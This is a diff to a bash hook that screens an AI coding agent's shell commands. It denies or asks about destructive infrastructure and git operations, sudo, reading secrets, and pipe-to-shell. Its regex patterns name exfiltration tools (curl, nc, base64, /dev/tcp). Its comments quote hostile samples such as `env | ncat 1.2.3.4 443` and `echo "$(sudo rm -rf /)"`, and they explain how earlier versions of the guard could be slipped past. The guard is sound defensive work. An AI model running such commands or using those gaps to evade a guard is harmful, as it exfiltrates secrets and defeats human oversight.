@@ -11,6 +11,20 @@ input="$(cat)"
 cmd="$(printf '%s' "$input" | jq -r '.tool_input.command // empty')"
 [[ -n "$cmd" ]] || exit 0
 
+# Быстрый отсев. Хук запускается на КАЖДОЙ команде, а разбор на сегменты плюс два
+# десятка grep стоят втрое дороже, чем один проход по строке. Список ниже —
+# строгий надмножество всего, на что вообще способно сработать хоть одно правило
+# ниже: если ни одного из этих имён в команде нет, ни один гейт не выстрелит.
+# Правила про `.env` и эксфильтрацию попадают сюда через сам литерал `.env` и
+# через `base64|nc|xxd`, поэтому cat/head/tail/env/set в списке не нужны.
+# ВАЖНО: добавляя правило с новым именем команды, добавь имя и сюда.
+# Вторая группа БЕЗ закрывающей `\b`: правила эксфильтрации и pipe-to-shell матчат
+# эти имена как подстроки, поэтому `env | ncat 1.2.3.4 443` должен пройти отсев.
+# С `\bnc\b` он его не проходил — а ncat это и есть штатный netcat из nmap, то есть
+# префильтр превращал жёсткий deny в тишину.
+GATED='\b(terraform|kubectl|helm|nomad|docker|git|rm|sudo|chmod|ansible-playbook|python3?|node|uv|zsh|bash|sh|dash|ksh|age-keygen)\b|\b(curl|wget|nc|base64|xxd)|/dev/tcp|\.ssh\b|\.config/sops/age|\.env'
+grep -Eq "$GATED" <<<"$cmd" || exit 0
+
 emit() {
   jq -nc --arg d "$1" --arg r "$2" \
     '{hookSpecificOutput:{hookEventName:"PreToolUse",permissionDecision:$d,permissionDecisionReason:$r}}'
@@ -45,28 +59,127 @@ at() { grep -Eq "${CP}$1" <<<"$cmd"; }
 # Written to a variable via a quoted heredoc: awk needs both quote characters
 # as literals, and nesting them inside a shell string is where this breaks.
 SPLIT_AWK=$(cat <<'AWK'
-{
-  n = length($0); out = ""; q = ""
+function walk(s,   n, i, c, out, q, rest, tag) {
+  n = length(s); out = ""; q = ""
   for (i = 1; i <= n; i++) {
-    c = substr($0, i, 1)
+    c = substr(s, i, 1)
     if (q != "") {                                  # внутри кавычек
-      if (c == "\\" && q == "\"") { i++; out = out c substr($0, i, 1); continue }
+      if (c == "\\" && q == "\"") { i++; out = out c substr(s, i, 1); continue }
+      # Подстановка внутри ДВОЙНЫХ кавычек выполняется: "$(sudo ls)" и "`sudo ls`" —
+      # такая же командная позиция, как вне кавычек. В одинарных это текст, поэтому
+      # ветка только для ". Без неё `echo "$(sudo rm -rf /)"` проходил молча.
+      if (q == "\"" && (c == "`" || (c == "$" && substr(s, i+1, 1) == "("))) {
+        print out; out = ""
+        if (c == "$") i++
+        continue
+      }
       if (c == q) q = ""
       out = out c
       continue
     }
-    if (c == "\\") { i++; out = out c substr($0, i, 1); continue }
+    if (c == "\\") { i++; out = out c substr(s, i, 1); continue }
     if (c == "'" || c == "\"") { q = c; out = out c; continue }
-    if (c == ";" || c == "|" || c == "&" || c == "(" || c == ")") {
+    # Открывашка heredoc — только на НЕзакавыченной позиции. Раньше тег искался
+    # match()-ем по сырой строке, и `git commit -m "docs: describe <<EOF usage"`
+    # взводил пропуск: весь остаток многострочной команды переставал разбираться,
+    # то есть один `<<Слово` в тексте отключал гард целиком.
+    if (c == "<" && substr(s, i+1, 1) == "<" && substr(s, i+2, 1) != "<" && hd == "") {
+      rest = substr(s, i)
+      if (match(rest, /^<<-?[[:space:]]*["']?[A-Za-z_][A-Za-z0-9_]*["']?/)) {
+        tag = substr(rest, RSTART, RLENGTH)
+        sub(/^<<-?[[:space:]]*/, "", tag)
+        gsub(/["']/, "", tag)
+        hd = tag                               # саму открывашку разбираем как обычно
+      }
+    }
+    if (c == ";" || c == "|" || c == "&" || c == "(" || c == ")" || c == "`") {
       print out; out = ""; continue
     }
     out = out c
   }
   print out
 }
+{
+  # Тело heredoc — данные, а не команды. Для `has` это ровно наоборот (телом и
+  # является скрипт, который надо прочитать), поэтому пропуск живёт только здесь.
+  # Без него документация, ЦИТИРУЮЩАЯ пример с подстановкой и sudo, получала deny:
+  # на этом споткнулась запись заметок в PROGRESS через heredoc.
+  buf[++nb] = $0
+  if (hd != "") {
+    line = $0
+    sub(/^[[:space:]]+/, "", line)          # <<- разрешает отступ у терминатора
+    sub(/[[:space:]]+$/, "", line)
+    if (line == hd) hd = ""
+    next
+  }
+  hdopen = nb
+  walk($0)
+}
+END {
+  # Тег не закрылся до конца команды — значит `<<` не открывал heredoc вовсе
+  # (арифметический сдвиг `$((1 << n))`, `<<TAG` в тексте). Проглотить хвост
+  # молча нельзя: там могут стоять настоящие команды. Разбираем пропущенное.
+  if (hd != "") for (i = hdopen + 1; i <= nb; i++) { hd = ""; walk(buf[i]) }
+}
 AWK
 )
-segs() { printf '%s\n' "$cmd" | awk "$SPLIT_AWK"; }
+
+# `zsh -c "terraform destroy"` — одна команда с головой zsh, и без этого шага ни одно
+# правило внутрь строки не заглянет: командная позиция там идёт после кавычки.
+# Вытаскиваем тело каждого `<shell> -c ...`, снимаем внешние кавычки и отдаём тому же
+# разбивателю. Цикл по строкам здесь безопасен: их единицы, а не тысячи.
+#
+# Флаги перед -c обязаны допускаться, и это не педантизм: `bash -lc "…"` — самая
+# частая форма из всех. Раньше тело вырезалось как ${line#*-c}, то есть по первой
+# подстроке "-c"; в `-lc`, `-ec`, `-ic`, `-xc` такой подстроки нет, срез не срабатывал
+# и внутрь кавычек не заглядывало ни одно правило — при том что bash/sh/zsh лежат
+# в allow ИМЕННО потому, что этот разбор считался работающим.
+# Тело ограничено кавычками или одним словом, а не `.*` до конца строки: так
+# grep -Eo отдаёт КАЖДЫЙ `<shell> -c` в строке, а не только первый.
+SHELLC_FLAGS='([[:space:]]+(-o[[:space:]]+[^[:space:]]+|--[a-z][a-z-]*|-[a-zA-Z]+))*[[:space:]]+-[a-zA-Z]*c[[:space:]]+'
+SHELLC_RE=$(cat <<RE
+(^|[[:space:]])([^[:space:]]*/)?(zsh|bash|sh|dash|ksh)${SHELLC_FLAGS}("[^"]*"|'[^']*'|[^[:space:]]+)
+RE
+)
+SHELLC_STRIP=$(cat <<RE
+s/^[[:space:]]*([^[:space:]]*\/)?(zsh|bash|sh|dash|ksh)${SHELLC_FLAGS}//
+RE
+)
+shellc_bodies() {
+  local line body first last
+  # Дешёвый отсев до дорогого grep -Eo: на команде без `-c` он всё равно проходит
+  # всю строку, а хук запускается на каждой команде.
+  grep -qE '(^|[[:space:]/])(zsh|bash|sh|dash|ksh)[[:space:]]+-' <<<"$cmd" || return 0
+  while IFS= read -r line; do
+    body=$(sed -E "$SHELLC_STRIP" <<<"$line")
+    first=${body:0:1}; last=${body: -1}
+    if [[ ( $first == '"' && $last == '"' ) || ( $first == "'" && $last == "'" ) ]]; then
+      body=${body:1:${#body}-2}
+    fi
+    printf '%s\n' "$body"
+  done < <(printf '%s\n' "$cmd" | grep -Eo -- "$SHELLC_RE")
+}
+
+# Разбор считается один раз за запуск: segs() зовут все правила, а на большой команде
+# каждый пересчёт — это awk плюс два grep. Кэш убирает их все, кроме первого.
+SEGS=''
+segs() {
+  if [[ -z $SEGS ]]; then
+    SEGS=$( { printf '%s\n' "$cmd" | awk "$SPLIT_AWK"; shellc_bodies | awk "$SPLIT_AWK"; } )
+  fi
+  printf '%s\n' "$SEGS"
+}
+
+# git пускает глобальные флаги перед подкомандой: `git -C /repo push`, `git -c k=v commit`.
+# Каждое git-правило обязано их допускать, иначе `Bash(git -C:*)` в allow становится
+# обходом и для гейта push, и для проверки gitleaks, и для deny на `reset --hard`.
+# Список флагов — по `git --help`, а не «те, что вспомнились»: пропущенный флаг это
+# не косметика, а обход всех git-правил разом. `--git-dir`/`--work-tree` принимают
+# значение и через пробел, а `-c` — со значением в кавычках (`-c user.name="a b"`).
+GITPFX=$(cat <<'RE'
+git([[:space:]]+(-C[[:space:]]*[^[:space:]]+|-c[[:space:]]*[^[:space:]]*("[^"]*"|'[^']*')?[^[:space:]]*|--(git-dir|work-tree|namespace|exec-path)([[:space:]]+|=)[^[:space:]]+|-[pP]|--(paginate|no-pager|bare|literal-pathspecs|no-optional-locks|no-replace-objects|no-lazy-fetch)))*[[:space:]]+
+RE
+)
 # Все три — конвейером, а не циклом по сегментам. Цикл с `grep` на каждой
 # итерации выглядел безобиднее, но hook запускается на КАЖДОЙ команде, а
 # heredoc с телом скрипта режется на тысячи сегментов: замер на команде в
@@ -76,33 +189,58 @@ segs() { printf '%s\n' "$cmd" | awk "$SPLIT_AWK"; }
 # совпадении, вышестоящий grep получает SIGPIPE, и под `pipefail` успешный
 # поиск вернул бы ненулевой статус.
 #
+# `--` обязателен: паттерн правила может начинаться с дефиса (`-c …hooksPath`), и
+# без него grep читает его как связку флагов и падает с usage — то есть правило
+# молча перестаёт срабатывать, а не ломается заметно.
 # segment headed by $1 that ALSO matches $2
-seg_with() { segs | grep -E "^[[:space:]]*$1" | grep -E "$2" >/dev/null; }
+seg_with() { segs | grep -E -- "^[[:space:]]*$1" | grep -E -- "$2" >/dev/null; }
 # any segment headed by $1 — the same question `at` answers, but decided by the
 # quote-aware splitter instead of CP. Use it when the rule is about the command
 # name alone: CP does not treat `$(` as a command position, so `at` misses
 # `echo $(docker volume rm x)`.
-seg_head() { segs | grep -E "^[[:space:]]*$1" >/dev/null; }
+seg_head() { segs | grep -E -- "^[[:space:]]*$1" >/dev/null; }
 # segment headed by $1 that does NOT match $2. Пусто на входе — значит такой
 # команды в строке нет, и спрашивать не о чем: grep -v тоже вернёт 1.
-seg_without() { segs | grep -E "^[[:space:]]*$1" | grep -vE "$2" >/dev/null; }
+seg_without() { segs | grep -E -- "^[[:space:]]*$1" | grep -vE -- "$2" >/dev/null; }
+
+# Правила ниже спрашивают «стоит ли эта команда в голове сегмента», и отвечает на это
+# seg_head поверх квото-ориентированного разбора, а не CP. Разница видна на двух случаях,
+# и оба реальные: `echo $(sudo rm -rf /)` CP не считал командной позицией и пропускал, а
+# `git commit -m "chore(sudo): …"` — считал бы, если добавить `(` в CP, и давал ложный deny.
+# Разбор с учётом кавычек снимает и то, и другое: внутри кавычек это данные, вне — команда.
+# На `at` остались ровно два правила, которым нужно видеть строку ЦЕЛИКОМ, поперёк пайпа.
 
 # ---- DENY: destructive infrastructure (manual only) ----
-at 'terraform[[:space:]]+destroy\b'                  && deny "terraform destroy — run it manually"
-at 'terraform[[:space:]]+state[[:space:]]+(rm|mv)\b' && deny "terraform state rm/mv — manual only"
-at 'kubectl[[:space:]]+(delete|drain)\b'             && deny "kubectl delete/drain — manual only"
-at 'helm[[:space:]]+(uninstall|rollback)\b'          && deny "helm uninstall/rollback — manual only"
-at 'nomad[[:space:]]+(job[[:space:]]+(stop|purge)|node[[:space:]]+drain|alloc[[:space:]]+stop)\b' \
-                                                     && deny "nomad stop/purge/drain — manual only"
+seg_head 'terraform[[:space:]]+destroy\b'                  && deny "terraform destroy — run it manually"
+seg_head 'terraform[[:space:]]+state[[:space:]]+(rm|mv)\b' && deny "terraform state rm/mv — manual only"
+seg_head 'kubectl[[:space:]]+(delete|drain)\b'             && deny "kubectl delete/drain — manual only"
+seg_head 'helm[[:space:]]+(uninstall|rollback)\b'          && deny "helm uninstall/rollback — manual only"
+seg_head 'nomad[[:space:]]+(job[[:space:]]+(stop|purge)|node[[:space:]]+drain|alloc[[:space:]]+stop)\b' \
+                                                           && deny "nomad stop/purge/drain — manual only"
 # Same class as `docker system prune`, which is already denied in settings.json:
 # it wipes every unused volume, and named volumes are somebody's data.
-at 'docker[[:space:]]+volume[[:space:]]+prune\b'     && deny "docker volume prune wipes unused volumes — manual only"
+seg_head 'docker[[:space:]]+volume[[:space:]]+prune\b'     && deny "docker volume prune wipes unused volumes — manual only"
+
+# ---- DENY: git operations that throw work away ----
+# settings.json denies these by prefix (`git reset --hard:*` и т. п.), но префикс не
+# матчится на `git -C /repo reset --hard`. Пока `git -C` не был в allow, это было
+# неважно; теперь он там, и дыру закрывает только правило с GITPFX.
+seg_head "${GITPFX}reset[[:space:]]+--hard\b"              && deny "git reset --hard discards uncommitted work — manual only"
+seg_head "${GITPFX}clean\b"                                && deny "git clean deletes untracked files — manual only"
+# `-fd`/`--delete --force` делают ровно то же, что `-D`; `git checkout .` — то же,
+# что `git checkout -- .`. Обе короткие формы встречаются чаще длинных, а
+# `Bash(git branch:*)` и `Bash(git checkout:*)` лежат в allow — то есть без этих
+# альтернатив работа удалялась вообще без единого вопроса.
+seg_head "${GITPFX}branch[[:space:]]+(-[a-zA-Z]*D|-[a-zA-Z]*(fd|df)|--delete[[:space:]]+--force|--force[[:space:]]+--delete)\b" \
+                                                           && deny "git branch force-delete — manual only"
+seg_head "${GITPFX}(checkout([[:space:]]+--)?|restore)[[:space:]]+\.([[:space:]]|$)" \
+                                                           && deny "discarding all local changes — manual only"
 
 # ---- DENY: destructive system / secret exfiltration (matters most under bypass) ----
-at 'rm[[:space:]]+-[a-zA-Z]*[rR][a-zA-Z]*[[:space:]]+(-[a-zA-Z]+[[:space:]]+)*(/|~|\$HOME|/\*|~/\*|\$HOME/\*)([[:space:]]|$)' \
-                                                     && deny "recursive delete of / or home"
-at 'sudo\b'                                          && deny "sudo — run it manually"
-if at '(cat|less|more|head|tail|bat)[[:space:]]+[^|;&]*\.env(\.[[:alnum:]_-]+)?' \
+seg_head 'rm[[:space:]]+-[a-zA-Z]*[rR][a-zA-Z]*[[:space:]]+(-[a-zA-Z]+[[:space:]]+)*(/|~|\$HOME|/\*|~/\*|\$HOME/\*)([[:space:]]|$)' \
+                                                           && deny "recursive delete of / or home"
+seg_head 'sudo\b'                                          && deny "sudo — run it manually"
+if seg_head '(cat|less|more|head|tail|bat)[[:space:]]+[^|;&]*\.env(\.[[:alnum:]_-]+)?' \
    && ! has '\.env\.(example|sample|template|dist)'; then deny "reading a plaintext .env file"; fi
 at '(printenv|env|set)\b[^|]*\|[^|]*(base64|curl|wget|nc|xxd)' && deny "environment-variable exfiltration"
 at '(curl|wget)\b[^|]*\|[[:space:]]*(sudo[[:space:]]+)?(bash|sh|zsh)\b' && deny "pipe-to-shell from network"
@@ -121,8 +259,16 @@ has '(\.ssh\b|\.config/sops/age|\bage-keygen\b)' && deny "touching private keys"
 # Fires only on a real `git commit` at command position, and only if gitleaks
 # is installed. Exit 1 == leak found; any other code (git failure / gitleaks
 # error) is treated as "nothing to block" so we never false-deny.
-if at 'git[[:space:]]+commit\b' && command -v gitleaks >/dev/null 2>&1; then
-  git diff --cached --no-color 2>/dev/null | gitleaks stdin --no-banner --redact >/dev/null 2>&1
+# GITPFX пускает сюда `git -C /other commit`, но сам скан обязан идти по ТОМУ репозиторию,
+# в который коммитят, а не по cwd хука. Иначе оба направления неверны: секрет в чужом репо
+# не находится, а чистый коммит блокируется утечкой из текущего каталога.
+if seg_head "${GITPFX}commit\b" && command -v gitleaks >/dev/null 2>&1; then
+  gitc=$(segs | grep -E "^[[:space:]]*${GITPFX}commit\b" \
+         | grep -Eo -- '-C[[:space:]]*[^[:space:]]+' | sed -E 's/^-C[[:space:]]*//' | head -1)
+  gitargs=()
+  [[ -n $gitc ]] && gitargs=(-C "$gitc")
+  git ${gitargs[@]+"${gitargs[@]}"} diff --cached --no-color 2>/dev/null \
+    | gitleaks stdin --no-banner --redact >/dev/null 2>&1
   [[ ${PIPESTATUS[1]} -eq 1 ]] \
     && deny "gitleaks flagged a secret in the staged diff — review it, then commit by hand or add a .gitleaksignore entry if it is a false positive"
 fi
@@ -173,11 +319,16 @@ if has "$INTERP"; then
 fi
 
 # ---- ASK: mutating infrastructure (confirm in the moment) ----
-at 'terraform[[:space:]]+apply\b'           && ask "terraform apply — confirm?"
-at 'kubectl[[:space:]]+apply\b'             && ask "kubectl apply — confirm?"
-at 'helm[[:space:]]+(install|upgrade)\b'    && ask "helm install/upgrade — confirm?"
-at 'nomad[[:space:]]+job[[:space:]]+run\b'  && ask "nomad job run — confirm?"
-at 'chmod[^|]*\b777\b'                        && ask "chmod 777 — confirm?"
+seg_head 'terraform[[:space:]]+apply\b'           && ask "terraform apply — confirm?"
+seg_head 'kubectl[[:space:]]+apply\b'             && ask "kubectl apply — confirm?"
+seg_head 'helm[[:space:]]+(install|upgrade)\b'    && ask "helm install/upgrade — confirm?"
+seg_head 'nomad[[:space:]]+job[[:space:]]+run\b'  && ask "nomad job run — confirm?"
+seg_with 'chmod\b' '\b777\b'                      && ask "chmod 777 — confirm?"
+
+# git push публикует наружу. Правило `Bash(git push:*)` в settings ловит только голый
+# префикс, а `git -C /repo push` начинается с `git -C` — и раз `git -C` теперь в allow,
+# без этого гейта push из другого каталога уходил бы молча.
+seg_head "${GITPFX}push\b"                        && ask "git push publishes — confirm?"
 
 # ---- ASK by argument, not by command name ----
 # These three were blanket `ask` entries in settings.json and the top prompt
@@ -201,8 +352,14 @@ seg_with 'curl\b' '(-X[[:space:]]*(POST|PUT|DELETE|PATCH)|--request[[:space:]]+(
 # config. Per segment, or `git config --list && git config core.hooksPath evil`
 # reads as a plain lookup — and core.hooksPath is arbitrary code on the next
 # git operation in that repo.
-seg_without 'git[[:space:]]+config\b' '(--get|--list|--name-only)' \
+seg_without "${GITPFX}config\b" '(--get|--list|--name-only)' \
                                               && ask "git config writes — confirm?"
+
+# `git -c core.hooksPath=X <что угодно>` — та же подмена хуков, что и запись через
+# `git config`, только разово и мимо правила выше: GITPFX глотает `-c k=v` как
+# безобидный глобальный флаг, а следующая же git-операция выполнит чужой код.
+seg_with 'git\b' '(^|[[:space:]])-c[[:space:]]*[^[:space:]]*hooksPath' \
+                                              && ask "git -c core.hooksPath runs arbitrary code on the next git operation — confirm?"
 
 # `docker compose:*` is in settings.json allow, so nothing else gates this:
 # `down -v` destroys named volumes, which is not the reversible local operation
@@ -250,7 +407,7 @@ seg_with 'curl\b' '(^|[[:space:]])(-[a-zA-Z]*O|--remote-name)([[:space:]]|$)' \
 curl_writes_a_file                            && ask "curl writing the response to a file — confirm the path?"
 
 # ---- ASK: broad git-add sweeps everything, incl. the private submodule ----
-at 'git[[:space:]]+add[[:space:]]+([^;&|]*[[:space:]])?(-A|--all|\.)([[:space:]]|$)' \
+seg_with "${GITPFX}add\b" '(^|[[:space:]])(-A|--all|\.)([[:space:]]|$)' \
                                               && ask "git add -A/./--all stages everything — prefer explicit paths?"
 
 exit 0
